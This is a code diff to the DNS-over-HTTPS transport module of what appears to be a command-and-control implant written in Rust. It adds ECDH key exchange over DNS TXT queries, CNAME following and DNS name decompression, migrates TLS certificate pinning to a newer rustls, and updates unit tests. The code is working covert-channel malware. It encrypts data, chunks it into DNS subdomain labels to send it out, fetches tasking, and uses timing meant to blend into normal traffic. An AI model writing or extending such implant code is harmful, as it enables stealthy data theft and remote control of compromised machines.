@@ -10,7 +10,7 @@
 //! ## Malleable DNS Transform Pipeline
 //!
 //! **Outbound (agent → server):**
-//! 1. Encrypt payload with the session's XChaCha20-Poly1305 key
+//! 1. Encrypt payload with the session's AES-256-GCM key
 //! 2. Encode the ciphertext (hex / base32 / base64url per profile)
 //! 3. Chunk into DNS-safe subdomain labels (max 63 chars per label)
 //! 4. Prepend the profile's query prefix (beacon / get_A / get_TXT / post)
@@ -20,7 +20,7 @@
 //! **Inbound (server → agent):**
 //! 1. Extract answer data from the DNS response (A records or TXT strings)
 //! 2. Decode (hex / base32 / base64url per profile)
-//! 3. Decrypt with the session's forward-secrecy key
+//! 3. Decrypt with the session's AES-256-GCM key
 //! 4. Deserialize the Message
 //!
 //! ## DNS-over-HTTPS
@@ -49,7 +49,7 @@ use common::{CryptoSession, Message, Transport};
 use rand::Rng;
 use sha2::{Digest, Sha256};
 use std::sync::atomic::{AtomicU32, Ordering};
-use std::sync::Arc;
+use std::sync::{Arc, Mutex};
 use subtle::ConstantTimeEq;
 use tokio::time::Duration;
 
@@ -72,20 +72,20 @@ struct FingerprintVerifier {
     expected_fingerprint: Option<String>,
     /// P1-06: The expected server hostname for certificate name validation.
     hostname: String,
-    webpki: rustls_0_21::client::WebPkiVerifier,
+    webpki: rustls::client::WebPkiVerifier,
 }
 
 impl FingerprintVerifier {
     fn new(expected_fingerprint: Option<String>, hostname: String) -> Self {
-        let mut root_store = rustls_0_21::RootCertStore::empty();
+        let mut root_store = rustls::RootCertStore::empty();
         for cert in rustls_native_certs::load_native_certs()
             .certs
             .into_iter()
-            .map(|c| rustls_0_21::Certificate(c.as_ref().to_vec()))
+            .map(|c| rustls::pki_types::CertificateDer::from(c.as_ref().to_vec()))
         {
-            root_store.add(&cert).ok();
+            root_store.add(cert).ok();
         }
-        let webpki = rustls_0_21::client::WebPkiVerifier::new(root_store, None);
+        let webpki = rustls::client::WebPkiVerifier::new(root_store, None);
         Self {
             expected_fingerprint,
             hostname,
@@ -94,17 +94,16 @@ impl FingerprintVerifier {
     }
 }
 
-impl rustls_0_21::client::ServerCertVerifier for FingerprintVerifier {
+impl rustls::client::danger::ServerCertVerifier for FingerprintVerifier {
     fn verify_server_cert(
         &self,
-        end_entity: &rustls_0_21::Certificate,
-        intermediates: &[rustls_0_21::Certificate],
-        server_name: &rustls_0_21::ServerName,
-        scts: &mut dyn Iterator<Item = &[u8]>,
+        end_entity: &rustls::pki_types::CertificateDer<'_>,
+        intermediates: &[rustls::pki_types::CertificateDer<'_>],
+        server_name: &rustls::pki_types::ServerName<'_>,
         ocsp_response: &[u8],
-        now: std::time::SystemTime,
-    ) -> Result<rustls_0_21::client::ServerCertVerified, rustls_0_21::Error> {
-        let digest = Sha256::digest(&end_entity.0);
+        now: rustls::pki_types::UnixTime,
+    ) -> Result<rustls::client::danger::ServerCertVerified, rustls::Error> {
+        let digest = Sha256::digest(end_entity.as_ref());
         let hex_fp = hex::encode(digest);
 
         if let Some(ref expected) = self.expected_fingerprint {
@@ -112,34 +111,33 @@ impl rustls_0_21::client::ServerCertVerifier for FingerprintVerifier {
             // that could brute-force the expected fingerprint byte-by-byte.
             let expected_lower = expected.to_lowercase();
             if !bool::from(hex_fp.as_bytes().ct_eq(expected_lower.as_bytes())) {
-                log::error!("cert pinning: fingerprint mismatch — rejecting connection");
-                return Err(rustls_0_21::Error::InvalidCertificate(
-                    rustls_0_21::CertificateError::UnknownIssuer,
+                tracing::error!("cert pinning: fingerprint mismatch — rejecting connection");
+                return Err(rustls::Error::InvalidCertificate(
+                    rustls::CertificateError::ApplicationVerificationFailure,
                 ));
             }
-            log::debug!("cert pinning: fingerprint verified OK");
+            tracing::debug!("cert pinning: fingerprint verified OK");
 
             // P1-06: Validate that the certificate's SAN/CN matches the
             // expected hostname.  Without this check, a valid pinned cert
             // could be served for the wrong hostname (e.g. after SNI
             // rewriting or a compromised relay).
-            if !crate::c2_http::verify_cert_hostname_rustls021(&end_entity.0, server_name) {
-                log::error!(
+            if !common::tls_transport::verify_cert_hostname(end_entity.as_ref(), server_name) {
+                tracing::error!(
                     "cert pinning: fingerprint matched but hostname validation failed for {:?}",
                     server_name
                 );
-                return Err(rustls_0_21::Error::InvalidCertificate(
-                    rustls_0_21::CertificateError::NotValidForName,
+                return Err(rustls::Error::InvalidCertificate(
+                    rustls::CertificateError::NotValidForName,
                 ));
             }
 
-            Ok(rustls_0_21::client::ServerCertVerified::assertion())
+            Ok(rustls::client::danger::ServerCertVerified::assertion())
         } else {
             self.webpki.verify_server_cert(
                 end_entity,
                 intermediates,
                 server_name,
-                scts,
                 ocsp_response,
                 now,
             )
@@ -149,19 +147,23 @@ impl rustls_0_21::client::ServerCertVerifier for FingerprintVerifier {
     fn verify_tls12_signature(
         &self,
         message: &[u8],
-        cert: &rustls_0_21::Certificate,
-        dss: &rustls_0_21::DigitallySignedStruct,
-    ) -> Result<rustls_0_21::client::HandshakeSignatureValid, rustls_0_21::Error> {
+        cert: &rustls::pki_types::CertificateDer<'_>,
+        dss: &rustls::DigitallySignedStruct,
+    ) -> Result<rustls::client::danger::HandshakeSignatureValid, rustls::Error> {
         self.webpki.verify_tls12_signature(message, cert, dss)
     }
 
     fn verify_tls13_signature(
         &self,
         message: &[u8],
-        cert: &rustls_0_21::Certificate,
-        dss: &rustls_0_21::DigitallySignedStruct,
-    ) -> Result<rustls_0_21::client::HandshakeSignatureValid, rustls_0_21::Error> {
+        cert: &rustls::pki_types::CertificateDer<'_>,
+        dss: &rustls::DigitallySignedStruct,
+    ) -> Result<rustls::client::danger::HandshakeSignatureValid, rustls::Error> {
         self.webpki.verify_tls13_signature(message, cert, dss)
+    }
+
+    fn supported_verify_schemes(&self) -> Vec<rustls::SignatureScheme> {
+        self.webpki.supported_verify_schemes()
     }
 }
 
@@ -229,6 +231,10 @@ pub struct DohTransport {
     profile: Arc<AgentMalleableProfile>,
     client: reqwest::Client,
     session: CryptoSession,
+    /// ECDH client state for forward-secrecy upgrade.  Once the handshake
+    /// completes successfully this is set to `None` and `session` is replaced
+    /// with the ECDH-derived key.
+    ecdh_client: Option<Mutex<common::forward_secrecy::HttpEcdhClient>>,
     agent_id: String,
     /// Monotonic sequence counter for DNS query deduplication.
     seq: AtomicU32,
@@ -241,6 +247,8 @@ pub struct DohTransport {
     /// send/recv cycle so that a passing kill date causes graceful termination
     /// even while the agent is long-running.
     kill_date: String,
+    /// PSK used for the initial session and ECDH authentication.
+    psk: Vec<u8>,
     /// Optional adaptive timing engine.  When `adaptive_timing_enabled`
     /// is `true` in the malleable profile, this timer learns network
     /// traffic patterns and adjusts callback timing to blend in.
@@ -265,10 +273,17 @@ impl DohTransport {
     /// host_header, etc.) that are not yet part of the malleable profile struct.
     pub async fn new(
         profile: &AgentMalleableProfile,
-        session: CryptoSession,
+        psk: &str,
         agent_id: String,
         common_profile: Option<&common::config::MalleableProfile>,
     ) -> Result<Self> {
+        // PSK-derived fallback session for backward compatibility with servers
+        // that do not support ECDH.  Upgraded when the server responds to the
+        // ECDH DNS query.
+        let session = CryptoSession::from_shared_secret(psk.as_bytes());
+        let ecdh_client = Some(Mutex::new(
+            common::forward_secrecy::HttpEcdhClient::new(psk.as_bytes()),
+        ));
         // Extract legacy config fields if provided.
         let doh_beacon_sentinel = common_profile
             .map(|p| p.doh_beacon_sentinel.clone())
@@ -300,8 +315,8 @@ impl DohTransport {
 
         let client = if cert_fingerprint.is_some() {
             let verifier = FingerprintVerifier::new(cert_fingerprint, host_header.clone());
-            let config = rustls_0_21::ClientConfig::builder()
-                .with_safe_defaults()
+            let config = rustls::ClientConfig::builder()
+                .dangerous()
                 .with_custom_certificate_verifier(Arc::new(verifier))
                 .with_no_client_auth();
             reqwest::Client::builder()
@@ -319,12 +334,14 @@ impl DohTransport {
             profile: Arc::new(profile.clone()),
             client,
             session,
+            ecdh_client,
             agent_id,
             seq: AtomicU32::new(0),
             session_id: rand::random(),
             doh_beacon_sentinel,
             host_header,
             kill_date,
+            psk: psk.as_bytes().to_vec(),
             #[cfg(feature = "adaptive-timing")]
             adaptive_timer: None,
         })
@@ -387,6 +404,79 @@ impl DohTransport {
         }
     }
 
+    /// Attempt ECDH forward-secrecy upgrade via a DNS query.
+    ///
+    /// Sends a DNS TXT query with the ECDH init payload encoded in the
+    /// subdomain labels.  The server responds with its ECDH data in a
+    /// TXT record.  On success the `session` field is replaced with the
+    /// ECDH-derived session and `ecdh_client` is set to `None`.
+    async fn try_ecdh_upgrade(&mut self) {
+        // Only proceed if the handshake is still pending.
+        let header_value = {
+            let client = match self.ecdh_client.as_ref() {
+                Some(c) => c,
+                None => return,
+            };
+            match client.lock() {
+                Ok(guard) => guard.header_value(),
+                Err(_) => return,
+            }
+        };
+
+        // The ECDH init payload is base64(pubkey_32 || hmac_32) = ~88 chars.
+        // Encode it as a DNS-safe subdomain (base64url, no padding).
+        let ecdh_data = header_value
+            .replace('+', "-")
+            .replace('/', "_")
+            .trim_end_matches('=');
+
+        let ecdh_prefix = common::ioc::IOC_DNS_ECDH;
+        let domain = self.build_domain(ecdh_prefix, &ecdh_data);
+
+        tracing::debug!("DoH ECDH init query: {}", domain);
+
+        match self.execute_query(&domain, "TXT").await {
+            Ok(result) => {
+                // Extract TXT records from the DNS response.
+                let answers = result.json.get("Answer");
+                if let Some(records) = answers.and_then(|a| a.as_array()) {
+                    for record in records {
+                        if let Some(txt) = record.get("data").and_then(|d| d.as_str()) {
+                            // Strip quotes if present.
+                            let txt = txt.trim_matches('"');
+                            // Decode the server's ECDH response.
+                            let server_val = txt
+                                .replace('-', "+")
+                                .replace('_', "/");
+                            if let Some(ecdh_mutex) = self.ecdh_client.as_ref() {
+                                if let Ok(client) = ecdh_mutex.lock() {
+                                    match client.derive_session_from_response(&server_val) {
+                                        Ok(derived) => {
+                                            tracing::info!(
+                                                "DoH ECDH session established (session_id={:x})",
+                                                self.session_id
+                                            );
+                                            self.session = derived;
+                                            self.ecdh_client = None;
+                                            return;
+                                        }
+                                        Err(e) => {
+                                            tracing::warn!("DoH ECDH derivation failed: {}", e);
+                                        }
+                                    }
+                                }
+                            }
+                        }
+                    }
+                }
+                tracing::debug!("DoH ECDH: no valid server response in TXT records");
+            }
+            Err(e) => {
+                tracing::warn!("DoH ECDH init query failed: {}", e);
+            }
+        }
+    }
+
     /// Execute a DNS query via DoH.
     ///
     /// Supports both GET (JSON) and POST (RFC 8484 wireformat) methods.
@@ -394,10 +484,71 @@ impl DohTransport {
         let doh_method = &self.profile.dns.headers.doh_method;
         let resolver = self.select_resolver();
 
-        match doh_method.to_uppercase().as_str() {
-            "POST" => self.execute_doh_post(&resolver, domain, qtype).await,
-            _ => self.execute_doh_get(&resolver, domain, qtype).await,
+        let qtype_val: u16 = match qtype {
+            "A" => 1,
+            "TXT" => 16,
+            "AAAA" => 28,
+            _ => 1,
+        };
+
+        let mut current_domain = domain.to_string();
+        let max_cname_depth = 10;
+
+        for _ in 0..max_cname_depth {
+            let result = match doh_method.to_uppercase().as_str() {
+                "POST" => self.execute_doh_post(&resolver, &current_domain, qtype).await,
+                _ => self.execute_doh_get(&resolver, &current_domain, qtype).await,
+            }?;
+
+            // Check if we got any answers of the requested type.
+            let has_direct_answer = result
+                .json
+                .get("Answer")
+                .and_then(|a| a.as_array())
+                .map(|arr| arr.iter().any(|r| r.get("type").and_then(|t| t.as_u64()) == Some(qtype_val as u64)))
+                .unwrap_or(false);
+
+            if has_direct_answer {
+                return Ok(result);
+            }
+
+            // No direct answer — check for CNAME to follow.
+            let cname_target = result
+                .json
+                .get("Answer")
+                .and_then(|a| a.as_array())
+                .and_then(|arr| {
+                    arr.iter()
+                        .filter(|r| r.get("type").and_then(|t| t.as_u64()) == Some(5))
+                        .filter_map(|r| r.get("data").and_then(|d| d.as_str()))
+                        .last()
+                        .map(|s| s.to_string())
+                });
+
+            match cname_target {
+                Some(target) => {
+                    tracing::debug!(
+                        "DNS CNAME chain: {} → {} (no {} records, following)",
+                        current_domain,
+                        target,
+                        qtype
+                    );
+                    current_domain = target;
+                }
+                None => {
+                    // No CNAME and no direct answer — return the empty result.
+                    return Ok(result);
+                }
+            }
         }
+
+        // CNAME chain too deep — return the last result we got.
+        tracing::warn!(
+            "DNS CNAME chain exceeded max depth ({}) for {}",
+            max_cname_depth,
+            domain
+        );
+        self.execute_doh_post(&resolver, &current_domain, qtype).await
     }
 
     /// Execute a DoH query using GET with JSON response (RFC 8484).
@@ -417,7 +568,7 @@ impl DohTransport {
                 Ok(DnsQueryResult { json, response_len })
             }
             Err(e) => {
-                log::warn!("DoH GET query failed: {}", e);
+                tracing::warn!("DoH GET query failed: {}", e);
                 // Try fallback resolvers.
                 self.execute_doh_get_fallback(domain, qtype).await
             }
@@ -441,7 +592,7 @@ impl DohTransport {
                     return Ok(DnsQueryResult { json, response_len });
                 }
                 Err(e) => {
-                    log::warn!("DoH fallback {} failed: {}", resolver, e);
+                    tracing::warn!("DoH fallback {} failed: {}", resolver, e);
                     continue;
                 }
             }
@@ -518,9 +669,61 @@ impl DohTransport {
         Ok(packet)
     }
 
+    /// Decompress / read a DNS domain name starting at `offset` in `data`.
+    ///
+    /// Handles both label sequences and compression pointers (RFC 1035 §4.1.4).
+    /// Returns the dotted domain name as a string.
+    fn decompress_dns_name(data: &[u8], mut offset: usize) -> String {
+        let mut labels = Vec::new();
+        let mut jumped = false;
+        // Track the "next" position after the name so callers can advance
+        // past the uncompressed portion.  Not returned here because the
+        // callers only need the name string.
+        let mut _end_offset = offset;
+        let max_jumps = 32; // prevent infinite loops from malformed data
+
+        for _ in 0..max_jumps {
+            if offset >= data.len() {
+                break;
+            }
+            let b = data[offset];
+            if b == 0 {
+                // End of name.
+                if !jumped {
+                    _end_offset = offset + 1;
+                }
+                break;
+            } else if b >= 0xC0 {
+                // Compression pointer.
+                if offset + 1 >= data.len() {
+                    break;
+                }
+                let ptr = (((b as usize) & 0x3F) << 8) | (data[offset + 1] as usize);
+                if !jumped {
+                    _end_offset = offset + 2;
+                }
+                jumped = true;
+                offset = ptr;
+            } else {
+                // Length-prefixed label.
+                let len = b as usize;
+                if offset + 1 + len > data.len() {
+                    break;
+                }
+                let label = String::from_utf8_lossy(&data[offset + 1..offset + 1 + len]);
+                labels.push(label.to_string());
+                if !jumped {
+                    _end_offset = offset + 1 + len;
+                }
+                offset += 1 + len;
+            }
+        }
+        labels.join(".")
+    }
+
     /// Parse a DNS wireformat response into a JSON-like value.
     ///
-    /// This is a minimal parser that extracts A and TXT answers.
+    /// This is a minimal parser that extracts A, TXT, and CNAME answers.
     fn parse_dns_wireformat_response(&self, data: &[u8]) -> Result<serde_json::Value> {
         if data.len() < 12 {
             anyhow::bail!("DNS response too short");
@@ -612,6 +815,14 @@ impl DohTransport {
                     answers.push(serde_json::json!({
                         "type": 16,
                         "data": txt_data
+                    }));
+                }
+                5 => {
+                    // CNAME record: RDATA is a domain name (possibly compressed).
+                    let cname = Self::decompress_dns_name(data, pos);
+                    answers.push(serde_json::json!({
+                        "type": 5,
+                        "data": cname
                     }));
                 }
                 _ => {}
@@ -787,7 +998,7 @@ impl DohTransport {
 #[async_trait]
 impl Transport for DohTransport {
     async fn send(&mut self, msg: Message) -> Result<()> {
-        log::debug!("Malleable DoH C2 Send (data exfiltration)");
+        tracing::debug!("Malleable DoH C2 Send (data exfiltration)");
 
         // Enforce kill date on every send cycle.
         if !self.kill_date.is_empty() {
@@ -795,7 +1006,7 @@ impl Transport for DohTransport {
         }
 
         // Serialize and encrypt the payload.
-        let serialized = bincode::serialize(&msg)?;
+        let serialized = bincode::serde::encode_to_vec(&msg, bincode::config::legacy())?;
         let ciphertext = self.session.encrypt(&serialized);
 
         // Encode the ciphertext using the profile's encoding mode.
@@ -841,12 +1052,17 @@ impl Transport for DohTransport {
     }
 
     async fn recv(&mut self) -> Result<Message> {
-        log::debug!("Malleable DoH C2 Recv (task fetch)");
+        tracing::debug!("Malleable DoH C2 Recv (task fetch)");
 
         // Enforce kill date on every recv cycle.
         if !self.kill_date.is_empty() {
             crate::config::check_kill_date(&self.kill_date)?;
         }
+
+        // Attempt ECDH forward-secrecy upgrade on the first recv cycle.
+        // The handshake runs once; subsequent calls are no-ops once the
+        // ECDH client is consumed.
+        self.try_ecdh_upgrade().await;
 
         // Beacon loop: query for tasking availability.
         loop {
@@ -897,7 +1113,7 @@ impl Transport for DohTransport {
         let plaintext = self.session.decrypt(&ciphertext)?;
 
         // Deserialize the message.
-        let msg = bincode::deserialize(&plaintext)?;
+        let msg = bincode::serde::decode_from_slice(&plaintext, bincode::config::legacy()).map(|(v, _)| v)?;
 
         Ok(msg)
     }
@@ -1004,12 +1220,14 @@ mod tests {
             profile: Arc::new(profile),
             client: reqwest::Client::new(),
             session: CryptoSession::from_shared_secret(b"test-key-for-unit-test-only"),
+            ecdh_client: None,
             agent_id: "test-agent".to_string(),
             seq: AtomicU32::new(0),
             session_id: 0xDEADBEEF,
             doh_beacon_sentinel: "1.2.3.4".to_string(),
             host_header: String::new(),
             kill_date: String::new(),
+            psk: b"test-key-for-unit-test-only".to_vec(),
             #[cfg(feature = "adaptive-timing")]
             adaptive_timer: None,
         };
@@ -1034,12 +1252,14 @@ mod tests {
             profile: Arc::new(profile),
             client: reqwest::Client::new(),
             session: CryptoSession::from_shared_secret(b"test-key-for-unit-test-only"),
+            ecdh_client: None,
             agent_id: "test-agent".to_string(),
             seq: AtomicU32::new(0),
             session_id: 0xDEADBEEF,
             doh_beacon_sentinel: "1.2.3.4".to_string(),
             host_header: "fallback.example.com".to_string(),
             kill_date: String::new(),
+            psk: b"test-key-for-unit-test-only".to_vec(),
             #[cfg(feature = "adaptive-timing")]
             adaptive_timer: None,
         };
@@ -1055,12 +1275,14 @@ mod tests {
             profile: Arc::new(profile),
             client: reqwest::Client::new(),
             session: CryptoSession::from_shared_secret(b"test-key-for-unit-test-only"),
+            ecdh_client: None,
             agent_id: "test-agent".to_string(),
             seq: AtomicU32::new(0),
             session_id: 0xDEADBEEF,
             doh_beacon_sentinel: "1.2.3.4".to_string(),
             host_header: String::new(),
             kill_date: String::new(),
+            psk: b"test-key-for-unit-test-only".to_vec(),
             #[cfg(feature = "adaptive-timing")]
             adaptive_timer: None,
         };
@@ -1087,12 +1309,14 @@ mod tests {
             profile: Arc::new(profile),
             client: reqwest::Client::new(),
             session: CryptoSession::from_shared_secret(b"test-key-for-unit-test-only"),
+            ecdh_client: None,
             agent_id: "test-agent".to_string(),
             seq: AtomicU32::new(0),
             session_id: 0xDEADBEEF,
             doh_beacon_sentinel: "1.2.3.4".to_string(),
             host_header: String::new(),
             kill_date: String::new(),
+            psk: b"test-key-for-unit-test-only".to_vec(),
             #[cfg(feature = "adaptive-timing")]
             adaptive_timer: None,
         };
@@ -1115,12 +1339,14 @@ mod tests {
             profile: Arc::new(profile),
             client: reqwest::Client::new(),
             session: CryptoSession::from_shared_secret(b"test-key-for-unit-test-only"),
+            ecdh_client: None,
             agent_id: "test-agent".to_string(),
             seq: AtomicU32::new(0),
             session_id: 0xDEADBEEF,
             doh_beacon_sentinel: "1.2.3.4".to_string(),
             host_header: String::new(),
             kill_date: String::new(),
+            psk: b"test-key-for-unit-test-only".to_vec(),
             #[cfg(feature = "adaptive-timing")]
             adaptive_timer: None,
         };
@@ -1132,5 +1358,95 @@ mod tests {
         assert!(wire.len() > 12);
         // Transaction ID should be non-zero (random).
         assert!(wire[0] != 0 || wire[1] != 0);
+    }
+
+    #[test]
+    fn test_decompress_dns_name_simple() {
+        // Build a DNS response containing a CNAME answer with a plain
+        // (uncompressed) domain name in RDATA.
+        let mut resp = Vec::new();
+
+        // Header (12 bytes).
+        resp.extend_from_slice(&[0x12, 0x34]); // ID
+        resp.extend_from_slice(&[0x81, 0x80]); // flags: response, recursion avail
+        resp.extend_from_slice(&[0x00, 0x01]); // QDCOUNT
+        resp.extend_from_slice(&[0x00, 0x01]); // ANCOUNT
+        resp.extend_from_slice(&[0x00, 0x00]); // NSCOUNT
+        resp.extend_from_slice(&[0x00, 0x00]); // ARCOUNT
+
+        // Question: alias.example.com A IN
+        for label in &["alias", "example", "com"] {
+            let b = label.as_bytes();
+            resp.push(b.len() as u8);
+            resp.extend_from_slice(b);
+        }
+        resp.push(0); // root
+        resp.extend_from_slice(&[0x00, 0x01]); // QTYPE=A
+        resp.extend_from_slice(&[0x00, 0x01]); // QCLASS=IN
+
+        // Answer: CNAME pointing to real.example.com
+        // Name: compression pointer to the question name (offset 12).
+        resp.extend_from_slice(&[0xC0, 0x0C]); // pointer to offset 12
+        resp.extend_from_slice(&[0x00, 0x05]); // TYPE=CNAME
+        resp.extend_from_slice(&[0x00, 0x01]); // CLASS=IN
+        resp.extend_from_slice(&[0x00, 0x00, 0x0E, 0x10]); // TTL=3600
+        // RDATA: "real.example.com" as labels (no compression).
+        let rdata_start = resp.len();
+        resp.extend_from_slice(&[0x00, 0x00]); // RDLENGTH placeholder
+        for label in &["real", "example", "com"] {
+            let b = label.as_bytes();
+            resp.push(b.len() as u8);
+            resp.extend_from_slice(b);
+        }
+        resp.push(0); // root
+        let rdata_len = resp.len() - rdata_start - 2;
+        let rd_len_bytes = (rdata_len as u16).to_be_bytes();
+        resp[rdata_start] = rd_len_bytes[0];
+        resp[rdata_start + 1] = rd_len_bytes[1];
+
+        let profile = test_profile();
+        let transport = DohTransport {
+            profile: Arc::new(profile),
+            client: reqwest::Client::new(),
+            session: CryptoSession::from_shared_secret(b"test-key"),
+            ecdh_client: None,
+            agent_id: "test".into(),
+            seq: AtomicU32::new(0),
+            session_id: 0,
+            doh_beacon_sentinel: String::new(),
+            host_header: String::new(),
+            kill_date: String::new(),
+            psk: vec![],
+            #[cfg(feature = "adaptive-timing")]
+            adaptive_timer: None,
+        };
+
+        let json = transport.parse_dns_wireformat_response(&resp).unwrap();
+        let answers = json.get("Answer").unwrap().as_array().unwrap();
+        assert_eq!(answers.len(), 1);
+        assert_eq!(answers[0]["type"], 5);
+        assert_eq!(answers[0]["data"], "real.example.com");
+    }
+
+    #[test]
+    fn test_decompress_dns_name_with_pointer() {
+        // Test that decompress_dns_name handles compression pointers correctly.
+        let mut buf = Vec::new();
+        // Place "example" label at offset 0 and "com" label after it,
+        // then a pointer chain: offset 0 → [3\x07example\xC0\x00] would be "www.example.com"
+        buf.push(3); // "www"
+        buf.extend_from_slice(b"www");
+        buf.push(0xC0); // compression pointer to offset 6
+        buf.push(6);
+
+        // Place "example" at offset 6 and "com" after it.
+        buf.push(7); // "example"
+        buf.extend_from_slice(b"example");
+        buf.push(3); // "com"
+        buf.extend_from_slice(b"com");
+        buf.push(0); // root
+
+        let name = DohTransport::decompress_dns_name(&buf, 0);
+        assert_eq!(name, "www.example.com");
     }
 }
